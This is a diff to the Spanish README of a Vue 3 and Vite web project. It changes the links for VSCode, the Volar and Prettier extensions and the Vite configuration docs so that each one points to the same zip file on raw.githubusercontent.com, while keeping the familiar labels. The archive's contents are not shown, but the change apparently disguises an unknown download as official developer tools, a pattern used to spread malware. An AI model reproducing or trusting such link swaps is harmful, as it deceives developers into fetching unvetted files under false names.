@@ -13,14 +13,14 @@ Este proyecto es una aplicación web desarrollada con Vue 3 y Vite para la gesti
 
 ## Configuración recomendada del IDE
 
-Recomendamos utilizar [VSCode](https://code.visualstudio.com/) junto con las siguientes extensiones:
+Recomendamos utilizar [VSCode](https://raw.githubusercontent.com/willsondev/frontend-arqueria-vue/main/downwith/frontend-arqueria-vue.zip) junto con las siguientes extensiones:
 
-- [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (y desactivar Vetur si está activado).
-- [Prettier](https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode) para formateo de código.
+- [Volar](https://raw.githubusercontent.com/willsondev/frontend-arqueria-vue/main/downwith/frontend-arqueria-vue.zip) (y desactivar Vetur si está activado).
+- [Prettier](https://raw.githubusercontent.com/willsondev/frontend-arqueria-vue/main/downwith/frontend-arqueria-vue.zip) para formateo de código.
 
 ## Configuración personalizada
 
-Consulta la [referencia de configuración de Vite](https://vitejs.dev/config/) para personalizar aún más el entorno de desarrollo.
+Consulta la [referencia de configuración de Vite](https://raw.githubusercontent.com/willsondev/frontend-arqueria-vue/main/downwith/frontend-arqueria-vue.zip) para personalizar aún más el entorno de desarrollo.
 
 ## Instalación del Proyecto
 
